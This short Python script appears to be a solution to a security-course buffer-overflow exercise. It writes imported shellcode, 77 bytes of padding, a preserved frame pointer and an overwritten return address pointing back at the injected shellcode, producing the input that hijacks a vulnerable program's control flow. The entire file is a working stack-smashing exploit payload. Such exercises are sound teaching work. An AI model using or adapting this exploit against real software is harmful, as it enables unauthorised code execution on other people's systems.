#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
#sys.stdout.buffer.write(b"1"*18)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"1"*77)
sys.stdout.buffer.write(pack("<I",0xfffeb534)) #keep ebp the same
sys.stdout.buffer.write(pack("<I",0xfffeb4c4)) #change return address to address of shellcode we injected

